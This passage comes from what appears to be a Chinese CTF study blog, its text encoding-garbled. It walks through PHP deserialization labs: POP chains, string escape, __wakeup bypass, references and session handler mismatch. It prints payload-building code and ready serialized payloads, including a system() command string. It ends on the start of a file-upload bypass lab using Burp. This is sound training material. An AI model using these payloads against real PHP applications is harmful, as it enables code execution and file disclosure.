<li>indexé‡Œé¢å­˜åœ¨__construct()ä¼šä½¿$this-&gt;test &#x3D; new normal();è¿™ç‚¹è¦é¿å…ï¼Œä¸è¿‡ä»£ç é‡Œé¢ä¹Ÿæ²¡æœ‰åºåˆ—åŒ–æ­¥éª¤ï¼Œå°±æ— æ‰€è°“äº†</li>
<li>å…ˆåºåˆ—åŒ–å†ä¼ å…¥</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class index &#123;</span><br><span class="line">    private $test;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;test = new evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil &#123;</span><br><span class="line">    var $test2 = &quot;system(&#x27;whuami&#x27;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new index());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;index&quot;:1:&#123;s:11:&quot;indextest&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:17:&quot;system(&#x27;whuami&#x27;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>*testæ˜¯privateï¼Œåˆ«å¿˜äº†%00ï¼Œå› ä¸ºæ˜¯getâ€™æ–¹å¼ï¼Œä¼šè‡ªåŠ¨ç¼–ç ï¼Œä¸ç”¨å¤šä½™æ“ä½œäº†</p>
<p>ä¸ºå•¥å‡ºé—®é¢˜äº†æâ€¦æ€è€ƒâ€¦</p>
<p>whuami O.o?</p>
<p>åŸæ¥å› ä¸ºwhuamiâ€¦</p>
<hr>
<p> <strong>é­”æœ¯æ–¹æ³•è§¦å‘è§„åˆ™</strong></p>
<p>é­”æœ¯æ–¹æ³•è§¦å‘å‰ææ˜¯ï¼šé­”æœ¯æ–¹æ³•æ‰€åœ¨çš„ç±»(æˆ–å¯¹è±¡)è¢«è°ƒç”¨ </p>
<hr>
<h4 id="POPé“¾"><a href="#POPé“¾" class="headerlink" title="POPé“¾"></a>POPé“¾</h4><p>åœ¨ååºåˆ—åŒ–ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ•°æ®å°±æ˜¯å¯¹è±¡ä¸­çš„å±æ€§å€¼(<strong>æˆå‘˜å˜é‡</strong>),<br>æ‰€ä»¥åœ¨phpååºåˆ—åŒ–ä¸­æœ‰ä¸€ç§æ¼æ´åˆ©ç”¨æ–¹æ³•å«â€<strong>é¢å‘å±æ€§ç¼–ç¨‹</strong>â€œï¼Œ<br><strong>popé“¾</strong>å°±æ˜¯åˆ©ç”¨<strong>é­”æœ¯æ–¹æ³•</strong>åœ¨é‡Œé¢è¿›è¡Œ<strong>å¤šæ¬¡è·³è½¬</strong>ç„¶åè·å–<strong>æ•æ„Ÿæ•°æ®</strong>çš„ä¸€ç§payloadã€‚</p>
<hr>
<h4 id="POCé“¾"><a href="#POCé“¾" class="headerlink" title="POCé“¾"></a>POCé“¾</h4><p><strong>POC</strong>(å…¨ç¨‹:Proof of concept)ä¸­åˆè¯‘ä¸º<strong>æ¦‚å¿µéªŒè¯</strong>ã€‚åœ¨å®‰å…¨ç•Œå¯ä»¥ç†è§£ä¸ºæ¼æ´éªŒè¯ç¨‹åºã€‚POCæ˜¯ä¸€æ®µä¸å®Œæ•´çš„ç¨‹åºï¼Œä»…ä»…æ˜¯ä¸ºäº†è¯æ˜æå‡ºè€…çš„è§‚ç‚¹çš„ä¸€æ®µä»£ç ã€‚</p>
<hr>
<p><strong>POPä¾‹é¢˜02</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    private $var;</span><br><span class="line">    public function append($value)</span><br><span class="line">    &#123;</span><br><span class="line">        include($value);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<ol>
<li>ç›®æ ‡ï¼šecho$flagï¼Œéœ€è¦ç”¨åˆ°appendæ–¹æ³•</li>
<li>è§¦å‘__invokeï¼Œè°ƒç”¨appendï¼Œä½¿$var&#x3D;flag.php</li>
<li>__invokeçš„æ¡ä»¶æ˜¯æŠŠå¯¹è±¡å½“æˆå‡½æ•°ä½¿ç”¨ï¼Œå‘ç°åº•ä¸‹å­˜åœ¨return $functionï¼ˆï¼‰</li>
<li>$functionçš„å€¼ä¼šåœ¨__geté‡Œé¢è¢«èµ‹å€¼ä¸º$p</li>
<li>å› ä¸ºè¦è§¦å‘__invoke(),$påªèƒ½è¢«èµ‹å€¼ä¸ºinvoke()æ‰€åœ¨çš„ç±»Modifier</li>
<li>__getï¼ˆï¼‰çš„æ¡ä»¶æ˜¯è°ƒç”¨ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§</li>
<li>return $this-&gt;str-&gt;source; å°†$strèµ‹å€¼ä¸ºgetï¼ˆï¼‰æ‰€åœ¨çš„ç±»ï¼Œå› ä¸ºå…¶ä¸­ä¸å­˜åœ¨sourceï¼Œå°±ä¼šè§¦å‘getï¼ˆï¼‰</li>
<li>å®Œæˆç¬¬ä¸ƒç‚¹éœ€è¦è§¦å‘__tostringï¼Œæ¡ä»¶æ˜¯æŠŠå¯¹è±¡å½“æˆå­—ç¬¦ä¸²è°ƒç”¨</li>
<li>echo $this-&gt;source;è¿™è¡Œä»£ç æ­£å¥½å’Œ__tostringï¼ˆï¼‰å¤„äºåŒä¸€ç±»é‡Œé¢ï¼ŒæŠŠ$sourceèµ‹å€¼ä¸ºè‡ªèº«æ‰€å¤„çš„Showç±»å³å¯</li>
<li>è§¦å‘echoéœ€è¦æ»¡è¶³__wakeupï¼ˆï¼‰çš„æ¡ä»¶ï¼Œç›´æ¥æŠŠè¿™ä¸ªååºåˆ—åŒ–å³å¯.ovo</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    private $var = &#x27;flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line">$mod = new Modifier();</span><br><span class="line">$test = new Test();</span><br><span class="line">$test -&gt; p = $mod;</span><br><span class="line">$show = new Show();</span><br><span class="line">$show -&gt; str = $test;</span><br><span class="line">$show -&gt; source = $show;</span><br><span class="line">echo serialize($show);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:8:&quot;Modifier&quot;:1:&#123;s:13:&quot;%00Modifier%00var&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>æ£€æŸ¥ä¸€å“ˆï¼Œvaræ˜¯ä¸ªprivateå¯¹è±¡ï¼Œè®°å¾—åŠ ä¸Š%00</p>
<p>æˆåŠŸæƒ¹ovo</p>
<hr>
<p><strong>å­—ç¬¦ä¸²é€ƒé€¸</strong></p>
<p><strong>ååºåˆ—åŒ–åˆ†éš”ç¬¦ï¼š</strong><br>ååºåˆ—åŒ–ä»¥;}ç»“æŸï¼Œåé¢çš„å­—ç¬¦ä¸²ä¸å½±å“æ­£å¸¸çš„ååºåˆ—åŒ–<br><strong>å±æ€§é€ƒé€¸ï¼š</strong><br>ä¸€èˆ¬æ•°æ®å…ˆç»è¿‡ä¸€æ¬¡<strong>serialize</strong>å†ç»è¿‡<strong>unserialize</strong>ï¼Œåœ¨è¿™ä¸ªä¸­é—´ååºåˆ—åŒ–çš„<strong>å­—ç¬¦ä¸²å˜å¤š</strong>æˆ–è€…<strong>å˜å°‘</strong>çš„æ—¶å€™æœ‰å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–<strong>å±æ€§é€ƒé€¸</strong>ã€‚ </p>
<p><strong>é€ƒé€¸ä¾‹é¢˜01</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($name)&#123;</span><br><span class="line">    $safe=array(&quot;flag&quot;,&quot;php&quot;);</span><br><span class="line">    $name=str_replace($safe,&quot;hack&quot;,$name);</span><br><span class="line">    return $name;</span><br><span class="line">&#125;</span><br><span class="line">class test&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass=&#x27;daydream&#x27;;</span><br><span class="line">    function __construct($user)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$param=$_GET[&#x27;param&#x27;];</span><br><span class="line">$param=serialize(new test($param));</span><br><span class="line">$profile=unserialize(filter($param));</span><br><span class="line"></span><br><span class="line">if ($profile-&gt;pass==&#x27;escaping&#x27;)&#123;</span><br><span class="line">    echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li>ç”±replaceè¯­å¥ï¼Œä¼šæŠŠflag,phpæ›¿æ¢ä¸ºflagï¼Œå› ä¸ºflagå’Œhackéƒ½æ˜¯4å­—æ¯ï¼Œæ— æ³•é€ƒé€¸ï¼Œæ‰€ä»¥åº”è¯¥ç”¨phpæ›¿æ¢ï¼Œé•¿åº¦ä¼šå¢å¤šï¼Œæ¯ä¸ªphpå¢å¤šä¸€ä¸ª</li>
<li>éœ€è¦å°†passèµ‹å€¼ä¸ºescaping</li>
<li>ç›®æ ‡ï¼šO:4â€testâ€:2:{S:4:â€userâ€;N;S:4:â€passâ€;S:8:â€escapingâ€;}</li>
<li>â€œ;S:4:â€passâ€;S:8:â€escapingâ€;}å ä½29ä½ï¼Œæ‰€ä»¥éœ€è¦php*29</li>
<li>param&#x3D;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpâ€;S:4:â€passâ€;S:8:â€escapingâ€;}æˆåŠŸ</li>
</ol>
<hr>
<p><strong>__wakeupé­”æœ¯æ–¹æ³•ç»•è¿‡</strong></p>
<p>æ¼æ´äº§ç”ŸåŸå› :<br>å¦‚æœå­˜åœ¨__wakeupæ–¹æ³•ï¼Œè°ƒç”¨unserilize()æ–¹æ³•å‰åˆ™å…ˆè°ƒç”¨__wakeupæ–¹æ³•ï¼Œä½†æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°å¤§äºçœŸå®å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡__wakeup()çš„æ‰§è¡Œ</p>
<p><strong>ç»•è¿‡ä¾‹é¢˜01</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class secret&#123;</span><br><span class="line">    var $file=&#x27;index.php&#x27;;</span><br><span class="line"></span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;file=$file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        include_once($this-&gt;file);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;file=&#x27;index.php&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($cmd))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    if (preg_match(&#x27;/[oc]:\d+:/i&#x27;,$cmd))&#123;</span><br><span class="line">        echo &quot;Are you daydreaming?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        unserialize($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//sercet in flag.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/[oc]:\d+:/i</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ­£åˆ™è¡¨ç¤ºåŒ¹é…æŸ¥çœ‹æ˜¯å¦å«æœ‰æ•°å­—<br><strong>å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿ</strong><br>æˆ‘ä»¬ååºåˆ—åŒ–æ˜¯éœ€è¦æ•°å­—çš„é‚£æ€ä¹ˆç»•è¿‡å‘¢ï¼Œåªéœ€è¦åœ¨æ•°å­—å‰é¢åŠ ä¸Šä¸€ä¸ª+<strong>å·å³å¯ç»•è¿‡</strong></p>
<p>ååºåˆ—åŒ–ä¹‹åè°ƒç”¨__destruct()æŠŠfileèµ‹å€¼flag.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+6:â€œsecretâ€:2:&#123;s:+4:â€œfileâ€;s:+8:â€œflag.phpâ€;&#125;</span><br></pre></td></tr></table></figure>

<p>æœ€å¥½urlç¼–ç ä¸€ä¸‹ï¼Œé˜²æ­¢+å¼•èµ·é—®é¢˜</p>
<hr>
<p><strong>å¼•ç”¨</strong></p>
<p>PHP åœ¨åºåˆ—åŒ–æ•°ç»„æˆ–å¯¹è±¡æ—¶ï¼Œå¦‚æœé‡åˆ°ç›¸åŒçš„å…ƒç´ ï¼Œä¼šå°†å…¶å¤„ç†ä¸ºå¼•ç”¨ï¼Œä»¥èŠ‚çœç©ºé—´å’Œé¿å…å¾ªç¯å¼•ç”¨çš„é—®é¢˜ã€‚ </p>
<p>ç”¨é¢˜æ¼”ç¤ºä¸€ä¸‹</p>
<p><strong>å¼•ç”¨ä¾‹é¢˜01</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;pass&#x27;])) &#123;</span><br><span class="line">    $pass = $_GET[&#x27;pass&#x27;];</span><br><span class="line">    $pass=str_replace(&#x27;*&#x27;,&#x27;\*&#x27;,$pass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = unserialize($pass);</span><br><span class="line"></span><br><span class="line">if ($o) &#123;</span><br><span class="line">    $o-&gt;secret = &quot;*&quot;;</span><br><span class="line">    if ($o-&gt;secret === $o-&gt;enter)</span><br><span class="line">        echo &quot;Congratulation! Here is my secret: &quot;.$flag;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Oh no... You can&#x27;t fool me&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else echo &quot;are you trolling?&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li>ç›®çš„æ˜¯è®©$o-&gt;secret &#x3D;&#x3D;&#x3D; $o-&gt;enterï¼›</li>
<li>å…¶ä¸­Â·$o-&gt;secret &#x3D; â€œ*â€;</li>
<li>ä½†æ˜¯$pass&#x3D;str_replace(â€˜*â€™,â€™*â€˜,$pass);ï¼Œä¼šæŠŠæ˜Ÿå·è¿‡æ»¤æ‰å˜æˆ&#x2F;+æ˜Ÿå·</li>
</ol>
<p>ä¸¾ä¸ªä¾‹å­</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class MyClass &#123;</span><br><span class="line">    public $A;</span><br><span class="line">    public $B;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new MyClass();</span><br><span class="line">$a-&gt;B = &quot;Hello&quot;;</span><br><span class="line">$a-&gt;A =&amp; $a-&gt;B;</span><br><span class="line"></span><br><span class="line">echo $a-&gt;A;  // è¾“å‡º &quot;Hello&quot;</span><br><span class="line">echo $a-&gt;B;  // è¾“å‡º &quot;Hello&quot;</span><br><span class="line"></span><br><span class="line">$a-&gt;B = &quot;World&quot;;</span><br><span class="line"></span><br><span class="line">echo $a-&gt;A;  // è¾“å‡º &quot;World&quot;</span><br><span class="line">echo $a-&gt;B;  // è¾“å‡º &quot;World&quot;</span><br></pre></td></tr></table></figure>

<p> åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œå°† <code>$a-&gt;A</code> è®¾ç½®ä¸º <code>$a-&gt;B</code> çš„å¼•ç”¨åï¼Œå½“ä¿®æ”¹ <code>$a-&gt;B</code> çš„å€¼æ—¶ï¼Œ<code>$a-&gt;A</code> çš„å€¼ä¹Ÿä¼šéšä¹‹æ”¹å˜ã€‚è¿™æ˜¯å› ä¸ºå®ƒä»¬å¼•ç”¨äº†åŒä¸€ä¸ªå€¼ã€‚ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class just4fun &#123;</span><br><span class="line">    var $enter;</span><br><span class="line">    var $secret;</span><br><span class="line">&#125;</span><br><span class="line">$a = new just4fun();</span><br><span class="line">$a -&gt;enter=&amp;$a -&gt;secret;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125; </span><br></pre></td></tr></table></figure>

<p>R:2ä»£è¡¨æŒ‡å‘åºåˆ—åŒ–ç»“æœä¸­ç´¢å¼•å·ä¸º2çš„å€¼ï¼Œjust4funä¸º0ï¼Œenterä¸º1ï¼ŒNä¸º2</p>
<hr>
<p><strong>sessionååºåˆ—åŒ–æ¼æ´</strong></p>
<p><img src="/..%5Cimages%5Csession.png"></p>
<p><img src="/..%5Cimages%5Cs1.png"></p>
<p><img src="/..%5Cimages%5Cs2.png"></p>
<p><img src="/..%5Cimages%5Cs3.png"></p>
<p><strong>æœ¬è´¨ä¸Šæ˜¯å­˜å‚¨å’Œè¯»å–æ–¹å¼ä¸ä¸€æ ·å¯¼è‡´çš„</strong></p>
<hr>
<p><strong>sessionä¾‹é¢˜01</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">/*hint.php*/</span><br><span class="line">session_start();</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $her;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;her=md5(rand(1, 10000));</span><br><span class="line">        if ($this-&gt;name===$this-&gt;her)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<ol>
<li>if ($this-&gt;name&#x3D;&#x3D;&#x3D;$this-&gt;her)ç›®æ ‡æ˜¯nameå’Œherçš„å€¼ç›¸ç­‰ï¼Œè¿™ç‚¹éœ€è¦ç”¨åˆ°å¼•ç”¨</li>
<li>å‰é¢æ˜¯é»˜è®¤phpå½¢å¼ï¼Œåè€…æ˜¯php_serialize</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $her;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Flag();</span><br><span class="line">$a -&gt; name = &amp;$a-&gt; her;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>

<p>ç»“æœï¼šO:4:â€œFlagâ€:2:{s:4:â€œnameâ€;N;s:3:â€œherâ€;R:2;}<br>æœ€ç»ˆpayloadï¼š?a&#x3D;|O:4:â€œFlagâ€:2:{s:4:â€œnameâ€;N;s:3:â€œherâ€;R:2;} </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/23/serialize/" data-id="clto5uldc000atwb5cyrray6f" data-title="serialize" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-upload" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/15/upload/" class="article-date">
  <time class="dt-published" datetime="2024-02-15T15:39:23.000Z" itemprop="datePublished">2024-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/15/upload/">upload</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>ç¬¬ä¸€å…³</strong></p>
<p>å…ˆç”¨burpæŠ“åŒ…ï¼Œå‘ç°ä¸Šä¼ æ–‡ä»¶ä¹‹åçš„å¼¹çª—æ˜¯jså¼¹çª—ï¼Œå¹¶ä¸”æŠ“åŒ…æ²¡æŠ“åˆ°ä¸œè¥¿ï¼Œåˆ¤æ–­ä¸ºå‰ç«¯é€‰æ‹©å™¨</p>
<p>å°†æ–‡ä»¶åæ”¹æˆ.jpgå½¢å¼ï¼Œä¸Šä¼ æˆåŠŸ</p>
<p>åœ¨burpé‡Œé¢å°†.jpgæ”¹å›åŸæ¥çš„æ ¼å¼ï¼Œå‘é€</p>
<p>åœ¨uplodeæ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°å·²ä¸Šä¼ æ–‡ä»¶ï¼ŒæˆåŠŸã€‚</p>
<p><strong>ç¬¬äºŒå…³</strong></p>
<p>å…ˆç”¨burpæŠ“åŒ…ï¼Œç‚¹å‡»ä¸Šä¼ ç›´æ¥èƒ½æŠ“åˆ°ï¼Œåˆ¤æ–­ä¸ºåç«¯é€‰æ‹©å™¨</p>
<p>åœ¨burpçš„content-typeé‡Œé¢æ”¹æˆjpgï¼Œè¿˜æ˜¯ä¸æˆåŠŸ</p>
<p>æŸ¥çœ‹æºä»£ç ä¹‹åæŠŠcontent-typeå†…å®¹æ”¹æˆimage&#x2F;jpegï¼ŒæˆåŠŸ</p>
<p><strong>ç¬¬ä¸‰å…³</strong></p>
